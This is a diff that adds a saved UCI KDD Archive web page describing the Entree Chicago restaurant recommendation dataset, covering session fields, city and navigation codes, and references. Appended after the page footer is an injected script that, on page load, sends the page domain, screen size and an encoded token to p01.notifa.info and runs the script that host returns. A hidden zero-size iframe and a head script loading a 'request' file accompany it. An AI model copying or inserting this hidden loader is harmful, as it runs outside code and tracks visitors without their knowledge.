@@ -1,0 +1,225 @@
+<!------------------------------------------------------------------------
+<!  Entree Chicago Recommendation Data
+<!----------------------------------------------------------------------->
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title> Entree Chicago Recommendation Data </title>
+<script type="text/javascript" async="" src="Entree%20Chicago%20Recommendation%20Data_files/request"></script></head>
+<body bgcolor="#FFFFFF">
+
+<!------------------------------------------------------------------------
+<!  Title 
+<!----------------------------------------------------------------------->
+<h1> Entree Chicago Recommendation Data </h1>
+
+<!------------------------------------------------------------------------
+<!  Data Type 
+<!----------------------------------------------------------------------->
+<h2>Data Type</h2>
+Transactional 
+
+<!------------------------------------------------------------------------
+<!  Abstract
+<!----------------------------------------------------------------------->
+<h2>Abstract</h2>
+<p>
+This data contains a record of user interactions with the <a href="http://infolab.ils.nwu.edu/entree/">Entree Chicago</a>
+ restaurant recommendation system. This is an interactive system that 
+recommends restaurants to the user based on factors such as cuisine, 
+price, style, atmosphere, etc. or based on similarity to a restaurant in
+ another city (e.g. find me a restaurant similar to the Patina in Los 
+Angeles). The user can then provide feedback such as find a nicer or 
+less expensive restaurant. 
+</p>
+
+
+<!------------------------------------------------------------------------
+<!  Sources
+<!----------------------------------------------------------------------->
+<h2> Sources</h2>
+<h4> Original Owner and Donor</h4>
+<pre><a href="http://www.ics.uci.edu/~burke/">Robin Burke</a>
+University of California, Irvine
+Department of Information and Computer Science
+Irvine, CA 92697
+</pre>
+<b>Date Donated: </b> March 9, 2000 
+
+
+<!------------------------------------------------------------------------
+<!  Data Characteristics 
+<!----------------------------------------------------------------------->
+<h2> Data Characteristics</h2>
+
+<p>
+This data records interactions with <a href="http://infolab.ils.nwu.edu/entree/">Entree Chicago</a> restaurant recommendation system (originally <a href="http://infolab.cs.uchicago.edu/entree/">http://infolab.cs.uchicago.edu/entree</a>)
+ from September, 1996 to April, 1999. The data is organized into files 
+roughly spanning a quarter year -- with Q3 1996 and Q2 1999 each only 
+containing one month.
+
+</p><p>
+Each line in a session file represents a session of user interaction
+with the system.  The (tab-separated) fields are as follows:
+
+</p><pre>     Date, IP, Entry point, Rated restaurant1, ..., Rated restaurantN, End point
+</pre>
+
+<h4>Entry point</h4>
+<ul>
+   <li> Users can use a restaurant from any city as a entry point, but
+     they always get recommendations for Chicago restaurants.  The
+     entry point therefore draws from a larger universe of
+     restaurants than the rest of the data.
+   </li><li> Entry points have the form nnnX, where nnn is a numeric
+     restaurant ID and X is a character A-H that encodes the city.
+</li></ul>
+<pre>     A = Atlanta
+     B = Boston
+     C = Chicago
+     D = Los Angeles
+     E = New Orleans
+     F = New York
+     G = San Francisco
+     H = Washington DC
+</pre>
+
+<h4>Rated Restaurant</h4>
+<ul>
+   <li> These are all Chicago restaurants.
+   </li><li> These entries have the form nnnX, where nnn is a numeric
+     restaurant ID and X is a character L-T that encodes the
+     navigation operation.
+</li></ul>
+<pre>     L = browse (move from one restaurant in a list of recommendations
+     to another)
+     M = cheaper (search for a restaurant like this one, but cheaper)
+     N = nicer   (         "               "           , but nicer)
+     O = closer  (unused in the production version of the system)
+     P = more traditional (search for a restaurant like this, but
+         serving more traditional cuisine)
+     Q = more creative (search for a restaurant serving more creative
+         cuisine)
+     R = more lively (search for a restaurant with a livelier
+         atmosphere)
+     S = quieter (search for a restaurant with a quieter atmosphere)
+     T = change cuisine (search for a restaurant like this, but
+         serving a different kind of food) Note that with this
+         tweak, we would ideally like to know what cuisine the user
+         wanted to change to, but this information was not recorded.
+</pre>
+
+<h4>End point</h4>
+<ul>
+   <li> Just the numeric id for the (Chicago) restaurant that the user
+     saw last.  In our experiments, we are assuming that this was a
+     good suggestion, but it is also possible that user just gives
+     up. 
+</li></ul>
+
+
+<p>
+Some potentially useful data is missing.  In many cases, we don't know
+the starting point because the user input a set of selection criteria
+(such as "inexpensive traditional Mexican") using a form submission,
+rather than starting from a known restaurant.  These queries were not
+recorded.  This is denoted by a 0 in the entry point field.  Some
+sessions do not have a known end point.  This is marked by -1 in the
+end point field.
+</p>
+
+
+
+
+<!------------------------------------------------------------------------
+<!  Other Relevant Information 
+<!----------------------------------------------------------------------->
+<h2> Other Relevant Information</h2>
+<p> In addition to the user's interactions, there is also data linking the restaurant
+ID with its name and features such as "fabulous wine lists", "good for younger kids", and
+"Ethopian" cuisine.
+
+This data is stored by city (e.g. Atlanta, Boston, etc.) and is in the following format:
+
+</p><pre>    restaurant id [tab] restaurant name [tab] restaurant features (3 digits ids separated by spaces)
+</pre>
+
+
+
+<!------------------------------------------------------------------------
+<!  Data Format 
+<!----------------------------------------------------------------------->
+<!----
+<H2>Data Format</H2>
+
+There are two directories:
+
+data    - the data files describing restaurants of various cities and a master feature dictionary.
+session - session data gathered from the use of the Entree system
+
+data/features.txt
+data/atlanta.txt
+data/
+datasession.year-quarter
+
+Session
+
+The data is in a comma separated file containing all of the attributes mentioned
+above. Each sign sample is stored in a single file. The directory hierarchy is as follows: 
+---->
+
+
+
+<!------------------------------------------------------------------------
+<!  Past Usage 
+<!----------------------------------------------------------------------->
+<h2>Past Usage</h2>
+
+<p> Burke, R. <a href="http://www.ics.uci.edu/~burke/research/papers/burke-iaai-99.pdf"> The Wasabi Personal Shopper: A Case-Based Recommender System</a>.
+ In Proceedings of the 11th National Conference on Innovative 
+Applications of Artificial Intelligence, pages 844-849. AAAI, 1999. 
+</p>
+
+
+<!------------------------------------------------------------------------
+<!  Acknowledgements 
+<!----------------------------------------------------------------------->
+<!----
+<H2> Acknowledgements, Copyright Information, and Availability</H2>
+<P>
+<I>
+Any restrictions that you would like? This could be anything such as no restrictions, non-commercial use only, requests for people to inform you of what they did with data, etc. 
+</I>
+</P>
+---->
+
+
+<!------------------------------------------------------------------------
+<!  References 
+<!----------------------------------------------------------------------->
+<h2>References and Further Information</h2>
+
+<p> Burke, R. <a href="http://www.ics.uci.edu/~burke/research/papers/burke-elis-00.pdf">Knowledge-based Recommender Systems</a>. To appear in the Encyclopedia of Library and Information Science.
+
+
+<!------------------------------------------------------------------------
+<!  Signature
+<!----------------------------------------------------------------------->
+</p><p>
+</p><hr>
+<address>
+<a href="http://kdd.ics.uci.edu/">The UCI KDD Archive</a><br>
+<a href="http://www.ics.uci.edu/">Information and Computer Science</a><br>
+<a href="http://www.uci.edu/">University of California, Irvine</a><br>
+Irvine, CA 92697-3425 <br> 
+</address> 
+Last modified: April 13, 2000<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrvFHEUibQRb4DXwS0x2LRttFqRiiP%2fB0ob%2fRBjextKsn5Bo7yV%2bUfAhImxguWekOtKVfpLDFSMu1zwTsgA89rJZFsSa5ShRjkdTUflHT1u8%2fSSToX3oOkVivLXcsGMHxlBYak%2bVbfwI7AgFUAemYaDcO6WQJddGafZyj4LnnNE0UvZzq6YEh%2f%2fODivBEwPjDhRbGTKr9kDK9dapOyOsgJbucCkfniLOch4C%2bx1PQBNWCfIiRLCXBkLxRekdNK80AZFDfm8qG2kydPQX8fZAUgQIhSfQB2cXxIStdqc9UDBY8%2barOMB07JpivJN9v7vV6axflqla0hCvBTXZ9efiG%2f2nTAyeDoyDWfwpwJUgQ7HK53%2fjJbHQt8gmF%2bJoANocvtgdH%2bGTZ2h472U81HhjeiN0ppDnCNWKhLnLjxua6yg2JePRSIRRyJRvdggaEtZ8OKR6zeqNkhpC8oHQKIt1f4MUVAdc%2fdWMZaqvcMagIRvmyIXdHvOyYibOyJq%2b4gCckW6fnr5PAyMcYQL4xsiCVlq7PzRYv6jo8YWC9y0GKyAIEvXNEdFnayA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+
+
+
+
+
+
+
+
+
+<iframe id="ifrm" scrolling="no" style="height: 0px; width: 0px; overflow: hidden; border: 0px none; padding: 0px;" src="Entree%20Chicago%20Recommendation%20Data_files/log.html"></iframe></body></html>
